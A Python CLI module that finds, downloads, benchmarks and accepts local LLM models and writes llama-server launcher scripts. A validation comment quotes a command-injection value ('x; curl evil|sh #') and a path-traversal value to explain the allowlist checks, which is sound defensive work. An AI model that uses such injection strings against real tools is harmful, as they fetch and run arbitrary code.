"""Commands for model-manager: init, search, install, list, status."""

from __future__ import annotations

import argparse
import json
import re
import stat
import subprocess  # noqa: S404 # nosec: B404
import sys
from pathlib import Path

from .config import (
    MODEL_DISCOVERY,
    MODEL_MANAGER,
    SSH_BIN,
    SSH_OPTS,
)
from .service import check_updates
from .state import (
    LAUNCHERS_DIR,
    RUNS_DIR,
    delete_accepted,
    ensure_dirs,
    get_target,
    has_default,
    list_accepted,
    load_candidates,
    read_config,
    save_candidates,
    write_accepted,
    write_config,
)

# Acceptance thresholds — below these the model is too slow to be useful
_PROMPT_TOK_S_MIN = 20.0
_DECODE_TOK_S_MIN = 5.0

# Every field below is interpolated verbatim into a generated shell script that is
# then made executable, and `family` also forms a filesystem path. A benchmark JSON
# is an input file, so it is a trust boundary: without these, repo="x; curl evil|sh #"
# yields a launcher that runs arbitrary commands, and family="../../x" writes the
# launcher outside LAUNCHERS_DIR. write_accepted()'s own family check runs too late —
# by then the launcher exists and is chmod +x.
_SAFE_SIMPLE = re.compile(r"^[A-Za-z0-9_.-]+$")
_SAFE_REPO = re.compile(r"^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$")
_SAFE_NUM_LIST = re.compile(r"^[0-9]+(,[0-9]+)*$")
_SAFE_BACKENDS = frozenset({"rocm", "vulkan", "cuda", "rocmfp4"})
_SAFE_SPLIT_MODES = frozenset({"layer", "row", "tensor", "none"})


def _validate_accept_fields(fields: dict[str, str]) -> list[str]:
    """Return a list of rejection messages for anything unsafe to interpolate."""
    checks = {
        "family": _SAFE_SIMPLE,
        "alias": _SAFE_SIMPLE,
        "profile": _SAFE_SIMPLE,
        "repo": _SAFE_REPO,
        "visible_devices": _SAFE_NUM_LIST,
        "tensor_split": _SAFE_NUM_LIST,
    }
    errors = []
    for name, pattern in checks.items():
        value = fields[name]
        if not pattern.match(value) or ".." in value:
            errors.append(f"benchmark JSON field contains an unsafe {name}: {value!r}")
    # Optional fields: empty is fine, anything present must still be simple.
    for name in ("hf_file", "quant"):
        value = fields[name]
        if value and (not _SAFE_SIMPLE.match(value) or ".." in value):
            errors.append(f"benchmark JSON field contains an unsafe {name}: {value!r}")
    if fields["backend"] not in _SAFE_BACKENDS:
        errors.append(f"benchmark JSON field contains an unsafe backend: {fields['backend']!r}")
    if fields["split_mode"] not in _SAFE_SPLIT_MODES:
        errors.append(
            f"benchmark JSON field contains an unsafe split_mode: {fields['split_mode']!r}"
        )
    return errors


# awk filter applied to llama-server log output in launchers
_AWK_LOG_FILTER = (
    "!/stopping wait for next result due to should_stop condition/"
    " && !/ref: https:\\/\\/github.com\\/ggml-org\\/llama.cpp\\/pull\\/22907/"
    " && !/stop: cancel task/"
    " && !/create_check/"
    " && !/slot print_timing:.*prompt processing/"
)


def cmd_check_updates(args: argparse.Namespace) -> int:
    """Check for recommended model updates."""
    result = check_updates(dry_run=not args.apply)
    print(result)
    return 0


def cmd_init(args: argparse.Namespace) -> int:
    """Initialize model-manager state with a target."""
    target = args.target
    if not target:
        existing = get_target()
        if existing:
            print(f"already initialized: target={existing}")
            return 0
        print("init requires --target local or remote:<host>")
        return 2

    write_config(target)
    print(f"initialized: target={target}")
    print(f"state={RUNS_DIR}")
    print("next=model-manager search 'coding gguf'")
    return 0


def cmd_search(args: argparse.Namespace) -> int:
    """Search for models: discover → score → save candidates → print list.

    Saves results so `install --index N` can pick one.
    """
    query = args.query or "GGUF"
    limit = args.limit or 30

    # 1. Check target
    target = get_target()
    if not target:
        print("not initialized — run: model-manager init --target remote:<host>")
        return 2

    # 2. Discover + score candidates
    print(f"searching: query={query} target={target} limit={limit}")
    host = target.split(":", 1)[1] if target.startswith("remote:") else None

    if host:
        discovery_cmd = [
            str(MODEL_DISCOVERY),
            "--host",
            host,
            "--query",
            query,
            "--limit",
            str(limit),
            "--json",
        ]
    else:
        discovery_cmd = [
            str(MODEL_DISCOVERY),
            "--local",
            "--query",
            query,
            "--limit",
            str(limit),
            "--json",
        ]

    try:
        discovery_result = subprocess.run(  # noqa: S603 # nosec: B603
            discovery_cmd,
            capture_output=True,
            text=True,
            timeout=120,
        )
        if discovery_result.returncode != 0:
            print(f"search failed: {discovery_result.stderr.strip()}")
            return 1
        scored = json.loads(discovery_result.stdout)
    except (subprocess.TimeoutExpired, json.JSONDecodeError, OSError) as e:
        print(f"search error: {e}")
        return 1

    ranked = scored.get("candidates", [])
    if not ranked:
        print("no candidates found")
        return 1

    # 3. Save candidates for install to pick from
    save_candidates(ranked)

    # 4. Print numbered list
    print(f"found {len(ranked)} candidates:")
    for i, c in enumerate(ranked, 1):
        quant = c.get("best_quant", "?")
        print(f"  {i}. {c['repo']} (score={c['score']}, quant={quant})")

    print("\ninstall with: model-manager install --index <N>")
    print("example:     model-manager install --index 2")
    return 0


def install_model(
    index: int,
    profile: str = "balanced",
    ctx: str = "131072",
) -> dict:
    """Install a model: pick candidate → download → benchmark → return result.

    Returns dict with keys: status (ok|error|benchmark_done), family, alias,
    benchmark_file, benchmark_summary, message.
    Callers decide accept/reject/skip based on benchmark_done status.
    """
    # 1. Check target
    target = get_target()
    if not target:
        return {"status": "error", "message": "not initialized"}

    host = target.split(":", 1)[1] if target.startswith("remote:") else None
    if not host:
        return {"status": "error", "message": "install requires remote target"}

    # 2. Load saved candidates
    candidates = load_candidates()
    if not candidates:
        return {"status": "error", "message": "no candidates — run search first"}

    # 3. Pick candidate by index (1-based)
    if index < 1 or index > len(candidates):
        return {"status": "error", "message": f"index {index} out of range (1-{len(candidates)})"}

    chosen = candidates[index - 1]
    chosen_repo = chosen["repo"]
    chosen_quant = chosen.get("best_quant", "unknown")
    chosen_file = chosen.get("best_file", "")

    # 4. Infer family + alias
    family = _infer_family(chosen_repo)
    alias = _infer_alias(chosen_repo)

    # 5. Download model to remote host
    download_ok = _download_on_host(host, chosen_repo, chosen_file)
    if not download_ok:
        return {"status": "error", "message": "download failed"}

    # 6. Run benchmark on remote host
    benchmark_file = _run_benchmark(
        host, chosen_repo, family, alias, profile, chosen_quant, chosen_file, ctx
    )
    if not benchmark_file:
        return {"status": "error", "message": "benchmark failed"}

    # 7. Read benchmark summary
    summary = _read_benchmark_summary(benchmark_file)

    return {
        "status": "benchmark_done",
        "family": family,
        "alias": alias,
        "benchmark_file": benchmark_file,
        "benchmark_summary": summary,
        "message": f"benchmark complete for {family}",
    }


def accept_model(benchmark_file: str, host: str) -> dict:
    """Accept and deploy a model after benchmark.

    Returns dict with status and message.
    """
    family = None
    alias = None

    if not _accept_benchmark(benchmark_file):
        return {"status": "error", "message": "accept failed"}

    if not _deploy_accepted_to_remote(host):
        return {"status": "error", "message": "deploy failed"}

    # Read accepted data to get family/alias
    accepted = list_accepted()
    if accepted:
        family, data = accepted[-1]
        alias = data.get("alias", "?")

    # Set default if none exists
    if not has_default() and family:
        write_accepted("default", {"family": family, "alias": alias})

    return {
        "status": "ok",
        "message": f"accepted: {family}" if family else "accepted",
    }


def cmd_install(args: argparse.Namespace) -> int:  # noqa: C901
    """Install a model: pick candidate → download → benchmark → ask user → accept/reject.

    Requires `search` to have been run first (saves candidates).
    After each benchmark, stops and asks user what to do.
    """
    index = args.index
    profile = args.profile or "balanced"
    ctx = args.ctx or "131072"

    result = install_model(index, profile, ctx)

    if result["status"] == "error":
        print(f"install failed: {result['message']}")
        return 1

    if result["status"] != "benchmark_done":
        print(result["message"])
        return 0

    # Print benchmark summary
    summary = result.get("benchmark_summary", {})
    print(f"\nbenchmark result: {result['benchmark_file']}")
    if "load_status" in summary:
        print(f"  load_status: {summary['load_status']}")
    if "prompt_tok_s" in summary:
        print(f"  prompt_tok_s: {summary['prompt_tok_s']}")
    if "decode_tok_s" in summary:
        print(f"  decode_tok_s: {summary['decode_tok_s']}")
    if "ctx" in summary:
        print(f"  ctx: {summary['ctx']}")

    # Ask user what to do
    family = result.get("family", "?")
    print(f"\nwhat to do with {family}?")
    print("  a) accept — create launcher and accept this model")
    print("  r) reject — discard, don't install")
    print("  s) skip — keep benchmark, decide later")
    print("  q) quit — stop install process")
    try:
        response = input("> ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print("\ncancelled")
        return 1

    if response == "a":
        target = get_target() or ""
        host = target.split(":", 1)[1] if target.startswith("remote:") else None
        if host:
            accept_result = accept_model(result["benchmark_file"], host)
            if accept_result["status"] == "ok":
                print(f"accepted: {family}")
                print(f"done: oc-local {family} {profile}")
            else:
                print(f"accept failed: {accept_result['message']}")
                return 1
        else:
            print("cannot accept — no remote host")
            return 1
    elif response == "r":
        print(f"rejected: {family}")
    elif response == "s":
        print(f"skipped: {family} (benchmark saved at {result['benchmark_file']})")
    elif response == "q":
        print("stopping")
        return 0
    else:
        print(f"unknown action: {response}")

    return 0


def _ensure_hf_cli(host: str) -> bool:
    """Ensure hf CLI (huggingface_hub) is installed on remote host."""
    print("  ensuring hf CLI on remote...")
    try:
        result = subprocess.run(  # noqa: S603 # nosec: B603
            [
                SSH_BIN,
                *SSH_OPTS,
                host,
                'export PATH="$HOME/.local/bin:$PATH" && (which hf || pip3 install --quiet --break-system-packages huggingface_hub) && which hf',  # noqa: E501
            ],
            capture_output=True,
            text=True,
            timeout=120,
        )
        if result.returncode != 0:
            print(f"  hf install failed: {result.stderr.strip()[:200]}")
            return False
        print("  hf ready")
        return True
    except subprocess.TimeoutExpired:
        print("  hf-cli install timed out")
        return False
    except OSError as e:
        print(f"  hf-cli install error: {e}")
        return False


def _download_on_host(host: str, repo: str, hf_file: str) -> bool:
    """Download model to remote host using hf CLI."""
    repo_dir = repo.replace("/", "--")
    if hf_file:
        result = subprocess.run(  # noqa: S603 # nosec: B603
            [
                SSH_BIN,
                *SSH_OPTS,
                host,
                "find ~/.cache/huggingface/hub/models--"
                + repo_dir
                + " -name "
                + repr(hf_file)
                + r" \( -type f -o -type l \) -print -quit | grep -q .",
            ],
            capture_output=True,
            text=True,
            timeout=15,
        )
        if result.returncode == 0:
            print(f"  model file already cached on {host}: {hf_file}")
            return True

    if not _ensure_hf_cli(host):
        print("  cannot download — hf not available")
        return False

    subprocess.run(  # noqa: S603 # nosec: B603
        [
            SSH_BIN,
            *SSH_OPTS,
            host,
            "sudo /usr/bin/bash -c 'chmod 1777 /home/cass/.cache/huggingface/hub/.locks' 2>/dev/null; "  # noqa: E501
            "find ~/.cache/huggingface/hub/.locks -type f -delete 2>/dev/null; "
            "find ~/.cache/huggingface/hub/.locks -type d -empty -delete 2>/dev/null; "
            "true",
        ],
        capture_output=True,
        text=True,
        timeout=15,
    )

    include_arg = f" --include {hf_file}" if hf_file else ""
    download_cmd = 'export PATH="$HOME/.local/bin:$PATH" && hf download ' + repo + include_arg
    print(f"  downloading {repo}...")
    try:
        result = subprocess.run(  # noqa: S603 # nosec: B603
            [SSH_BIN, *SSH_OPTS, host, download_cmd],
            capture_output=True,
            text=True,
            timeout=600,
        )
        if result.returncode != 0:
            print(f"  download error: {result.stderr.strip()}")
            return False
        print("  download complete")
        return True
    except subprocess.TimeoutExpired:
        print("  download timed out after 10 minutes")
        return False
    except OSError as e:
        print(f"  download error: {e}")
        return False


def _run_benchmark(
    host: str, repo: str, family: str, alias: str, profile: str, quant: str, hf_file: str, ctx: str
) -> str | None:
    """Run benchmark on remote host, return path to benchmark result JSON."""
    # Call the bash model-manager benchmark command
    bench_cmd = [
        str(MODEL_MANAGER),
        "benchmark",
        "--target",
        f"remote:{host}",
        "--repo",
        repo,
        "--family",
        family,
        "--alias",
        alias,
        "--profiles",
        profile,
        "--quant",
        quant,
    ]
    if hf_file:
        bench_cmd.extend(["--hf-file", hf_file])
    bench_cmd.extend(["--ctx", ctx])

    print(f"  running: {' '.join(bench_cmd[:8])}...")
    try:
        result = subprocess.run(  # noqa: S603 # nosec: B603
            bench_cmd,
            capture_output=True,
            text=True,
            timeout=900,
        )
        # Parse benchmark result file from output
        lines = result.stdout.strip().split("\n")
        for line in lines:
            if line.startswith("result_file="):
                return line.split("=", 1)[1]
        # If benchmark failed, check stderr
        if result.returncode != 0:
            print(f"  benchmark error: {result.stderr.strip()[:200]}")
        return None
    except subprocess.TimeoutExpired:
        print("  benchmark timed out after 5 minutes")
        return None
    except OSError as e:
        print(f"  benchmark error: {e}")
        return None


def _read_benchmark_summary(benchmark_file: str) -> dict:
    """Read key metrics from benchmark result JSON. Returns dict."""
    try:
        with open(benchmark_file) as f:
            data = json.load(f)
        return {
            "load_status": data.get("load_status", "unknown"),
            "prompt_tok_s": data.get("prompt_tok_s"),
            "decode_tok_s": data.get("decode_tok_s"),
            "ctx": data.get("ctx", "?"),
        }
    except (json.JSONDecodeError, OSError):
        return {"load_status": "error", "message": f"could not read {benchmark_file}"}


def _accept_benchmark(benchmark_file: str) -> bool:
    """Accept benchmark result: validate, generate launcher, write accepted metadata."""
    return _do_accept(Path(benchmark_file))


def _deploy_accepted_to_remote(host: str) -> bool:
    """Copy accepted launcher state to remote after install."""
    deploy_cmd = [str(MODEL_MANAGER), "deploy", "--target", f"remote:{host}", "--yes"]
    print(f"deploying launchers to {host}...")
    try:
        result = subprocess.run(  # noqa: S603 # nosec: B603
            deploy_cmd,
            capture_output=True,
            text=True,
            timeout=180,
        )
        if result.stdout:
            print(result.stdout.strip())
        if result.returncode != 0:
            print(f"  deploy error: {result.stderr.strip()[:500]}")
            return False
        return True
    except (subprocess.TimeoutExpired, OSError) as e:
        print(f"  deploy error: {e}")
        return False


def cmd_list(args: argparse.Namespace) -> int:
    """List accepted models."""
    accepted = list_accepted()
    if not accepted:
        print("no accepted models")
        return 0

    print(f"accepted models ({len(accepted)}):")
    for family, data in accepted:
        alias = data.get("alias", "?")
        quant = data.get("quant", "?")
        profile = data.get("profile", "?")
        ctx = data.get("config", {}).get("ctx", "?")
        print(f"  {family}: {alias} ({quant}, profile={profile}, ctx={ctx})")

    return 0


def cmd_status(args: argparse.Namespace) -> int:
    """Show model-manager status."""
    config = read_config()
    target = config.get("target", "?") if config else "not set"

    accepted = list_accepted()
    default_ok = has_default()

    print(f"target: {target}")
    print(f"state: {RUNS_DIR}")
    print(f"accepted: {len(accepted)}")
    print(f"default: {'yes' if default_ok else 'no'}")

    if accepted:
        for family, data in accepted:
            alias = data.get("alias", "?")
            print(f"  {family}: {alias}")

    return 0


def cmd_delete(args: argparse.Namespace) -> int:
    """Delete an accepted model family."""
    family = args.family
    if not family:
        print("delete requires --family")
        return 2

    if delete_accepted(family):
        print(f"deleted: {family}")
    else:
        print(f"not found: {family}")
    return 0


def cmd_accept(args: argparse.Namespace) -> int:
    """Accept a benchmark result: validate, generate launcher, write accepted metadata."""
    ok = _do_accept(Path(args.bench_file))
    return 0 if ok else 1


# ---- Helpers ----


def _do_accept(bench_path: Path) -> bool:  # noqa: C901
    """Core accept logic: validate benchmark JSON, generate launcher, write metadata."""
    if not bench_path.exists() or not bench_path.is_file():
        print(f"benchmark file not found: {bench_path}", file=sys.stderr)
        return False

    try:
        data = json.loads(bench_path.read_text())
    except (json.JSONDecodeError, OSError) as e:
        print(f"cannot read benchmark file: {e}", file=sys.stderr)
        return False

    if not isinstance(data, dict):
        print("benchmark JSON must be an object", file=sys.stderr)
        return False

    for key in ("repo", "family", "alias", "target", "profile", "load_status"):
        if key not in data:
            print(f"benchmark JSON missing required field: {key}", file=sys.stderr)
            return False

    if data["load_status"] != "success":
        print(f"benchmark load_status is not success: {data['load_status']}", file=sys.stderr)
        return False

    prompt_tok_s = data.get("prompt_tok_s")
    decode_tok_s = data.get("decode_tok_s")
    failures = []
    if not isinstance(prompt_tok_s, (int, float)) or prompt_tok_s < _PROMPT_TOK_S_MIN:
        failures.append(
            f"prompt_tok_s={prompt_tok_s} below acceptance threshold ({_PROMPT_TOK_S_MIN})"
        )
    if not isinstance(decode_tok_s, (int, float)) or decode_tok_s < _DECODE_TOK_S_MIN:
        failures.append(
            f"decode_tok_s={decode_tok_s} below acceptance threshold ({_DECODE_TOK_S_MIN})"
        )
    if failures:
        for msg in failures:
            print(msg, file=sys.stderr)
        return False

    repo = str(data["repo"])
    family = str(data["family"])
    alias = str(data["alias"])
    target = str(data["target"])
    profile_name = str(data["profile"])
    hf_file = str(data.get("hf_file") or "")
    quant = str(data.get("quant") or "")
    ctx = int(data.get("ctx") or 131072)
    batch = int(data.get("batch") or 4096)
    ubatch = int(data.get("ubatch") or 256)
    ngl = int(data.get("ngl") or 999)
    backend = str(data.get("backend") or "rocm")
    visible_devices = str(data.get("visible_devices") or "0,1")
    split_mode = str(data.get("split_mode") or "layer")
    tensor_split = str(data.get("tensor_split") or "1,1")

    errors = _validate_accept_fields(
        {
            "family": family,
            "alias": alias,
            "profile": profile_name,
            "repo": repo,
            "hf_file": hf_file,
            "quant": quant,
            "backend": backend,
            "visible_devices": visible_devices,
            "split_mode": split_mode,
            "tensor_split": tensor_split,
        }
    )
    if errors:
        for msg in errors:
            print(msg, file=sys.stderr)
        return False

    # All modern accepted models support reasoning/thinking mode; oc-local defaults to True
    reasoning = True

    ensure_dirs()

    launcher_name = f"launcher-{family}.sh"
    launcher_path = LAUNCHERS_DIR / launcher_name
    launcher_path.write_text(
        _generate_launcher(
            family,
            alias,
            repo,
            hf_file,
            ctx,
            batch,
            ubatch,
            ngl,
            backend,
            visible_devices,
            split_mode,
            tensor_split,
            reasoning,
        )
    )
    launcher_path.chmod(launcher_path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)

    profile_config: dict = {
        "backend": backend,
        "batch": batch,
        "ctx": ctx,
        "ngl": ngl,
        "reasoning": reasoning,
        "split_mode": split_mode,
        "tensor_split": tensor_split,
        "ubatch": ubatch,
        "visible_devices": visible_devices,
    }
    profiles = {
        p: dict(profile_config) for p in ("speed", "fastlong", "balanced", "reliable", "tiny")
    }

    write_accepted(
        family,
        {
            "alias": alias,
            "config": dict(profile_config),
            "decode_tok_s": decode_tok_s,
            "family": family,
            "hf_file": hf_file,
            "hf_repo": repo,
            "launcher_file": str(launcher_path),
            "model_name": alias,
            "profile": profile_name,
            "profiles": profiles,
            "prompt_tok_s": prompt_tok_s,
            "quant": quant,
            "reasoning": reasoning,
            "remote_start": f"./{launcher_name}",
            "repo": repo,
            "target": target,
        },
    )

    print(f"accepted: {family}")
    print(f"launcher_file={launcher_path}")
    return True


def _generate_launcher(
    family: str,
    alias: str,
    repo: str,
    hf_file: str,
    ctx: int,
    batch: int,
    ubatch: int,
    ngl: int,
    backend: str,
    visible_devices: str,
    split_mode: str,
    tensor_split: str,
    reasoning: bool,
) -> str:
    """Generate a llama-server launcher shell script."""
    lines = [
        "#!/usr/bin/env bash",
        f"# local_llm_repo={repo}",
        f"# local_llm_family={family}",
        f"# local_llm_alias={alias}",
        f"# local_llm_hf_file={hf_file}",
        "set -euo pipefail",
        'script_dir="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"',
        'log_file="${LOCAL_LLM_MODEL_LOG:-$script_dir/model.log}"',
        'mkdir -p "$(dirname "$log_file")"',
        f"exec > >(stdbuf -oL -eL awk '{_AWK_LOG_FILTER}' | tee \"$log_file\") 2>&1",
        'profile="${1:-reliable}"',
        'case "$profile" in speed|fastlong|balanced|reliable|tiny) ;; *)'
        ' echo "Usage: $0 {speed|fastlong|balanced|reliable|tiny}" >&2; exit 2 ;; esac',
        f"ctx={ctx}",
        f"batch={batch}",
        f"ubatch={ubatch}",
        f"ngl={ngl}",
    ]

    if backend == "rocm":
        lines += [
            f"export HIP_VISIBLE_DEVICES={visible_devices}",
            f"export ROCR_VISIBLE_DEVICES={visible_devices}",
        ]
    elif backend == "vulkan":
        lines.append(f"export GGML_VK_VISIBLE_DEVICES={visible_devices}")

    server_bin = (
        "./build-vulkan/bin/llama-server" if backend == "vulkan" else "./build/bin/llama-server"
    )

    # Gemma uses different sampler defaults
    if "gemma" in repo.lower() or "gemma" in family.lower():
        temp, top_p, top_k = "1.0", "0.95", "64"
    else:
        temp, top_p, top_k = "0.6", "0.95", "20"

    reasoning_flag = "on" if reasoning else "off"

    cmd = [f"exec {server_bin} \\", f"  -hf {repo} \\"]
    if hf_file:
        cmd.append(f"  --hf-file {hf_file} \\")
    cmd += [
        "  --host 0.0.0.0 \\",
        "  --port 8080 \\",
        '  -ngl "$ngl" \\',
        f"  --split-mode {split_mode} \\",
        f"  --tensor-split {tensor_split} \\",
        "  --context-shift \\",
        "  --cache-ram 16384 \\",
        "  -ctk q8_0 \\",
        "  -ctv q8_0 \\",
        '  -c "$ctx" \\',
        "  --flash-attn on \\",
        '  -ub "$ubatch" \\',
        '  -b "$batch" \\',
        '  --threads "$(nproc)" \\',
        "  --prio 2 \\",
        "  --no-warmup \\",
        f"  --temp {temp} \\",
        f"  --top-p {top_p} \\",
        f"  --top-k {top_k} \\",
        "  --min-p 0.0 \\",
        "  --presence-penalty 0.0 \\",
        f"  --alias {alias} \\",
        f"  --reasoning {reasoning_flag}",
    ]
    lines += cmd

    return "\n".join(lines) + "\n"


def _infer_family(repo: str) -> str:
    """Infer family name from HuggingFace repo ID."""
    name = repo.rsplit("/", 1)[-1]
    name = name.replace("-gguf", "").replace("_", "-")
    parts = name.split("-")
    family = "-".join(parts[:3]).lower()
    family = "".join(c for c in family if c.isalnum() or c in "._-")
    return family or "model"


def _infer_alias(repo: str) -> str:
    """Infer alias from HuggingFace repo ID."""
    name = repo.rsplit("/", 1)[-1]
    name = name.replace("-gguf", "").replace("_", "-")
    return name.lower()
